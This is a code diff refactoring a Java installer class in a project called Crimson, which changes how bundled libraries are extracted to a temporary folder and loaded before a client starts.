@@ -30,15 +30,15 @@ import com.subterranean_security.crimson.core.platform.info.OS.OSFAMILY;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.util.B64Util;
 import com.subterranean_security.crimson.core.util.FileUtil;
-import com.subterranean_security.crimson.core.util.JarUtil;
-import com.subterranean_security.crimson.core.util.RandomUtil;
+import com.subterranean_security.crimson.nucleus.JarUtil;
+import com.subterranean_security.crimson.nucleus.Nucleus;
 
 public class Installer {
 
 	public static ClientConfig ic;
 	public static String jarPath;
 	public static String jarDir;
-	private static OSFAMILY os = Platform.osFamily;
+	private static OSFAMILY os;
 
 	private static boolean debug = new File("/debug.txt").exists();
 
@@ -52,40 +52,21 @@ public class Installer {
 			System.exit(1);
 		}
 
-		if (args.length > 0) {
-		//	try {
-		//		Thread.sleep(2000);
-		//	} catch (InterruptedException e) {
-		//		// TODO Auto-generated catch block
-		//		e.printStackTrace();
-		//	}
-
-		}
-
 		if (isInstalled()) {
 			Client.main(args);
 			return;
 		}
 
 		// don't use method in CUtil because it loads Common.java
-		File temp = new File(System.getProperty("java.io.tmpdir") + "/client_" + RandomUtil.randString(8));
+		File temp = new File(System.getProperty("java.io.tmpdir") + "/client_install");
 		temp.mkdir();
-		JarUtil.extract("com/subterranean_security/crimson/client/res/bin/lib.zip",
-				temp.getAbsolutePath() + "/lib.zip");
-		try {
-			FileUtil.unzip(temp.getAbsolutePath() + "/lib.zip", temp.getAbsolutePath());
-		} catch (IOException e2) {
-			System.out.println("Failed to extract libraries");
+
+		if (!Nucleus.loadTemporarily("com/subterranean_security/crimson/client/res/bin/lib.zip", temp)) {
+			System.out.println("Failed to load requisite libraries");
 			System.exit(1);
 		}
 
-		// load libraries
-		try {
-			JarUtil.load(temp.getAbsolutePath() + "/java/c09.jar");
-		} catch (Exception e1) {
-			System.out.println("FATAL: Failed to load requisite libraries");
-			System.exit(1);
-		}
+		os = Platform.osFamily;
 
 		try {
 			ic = readInternal();
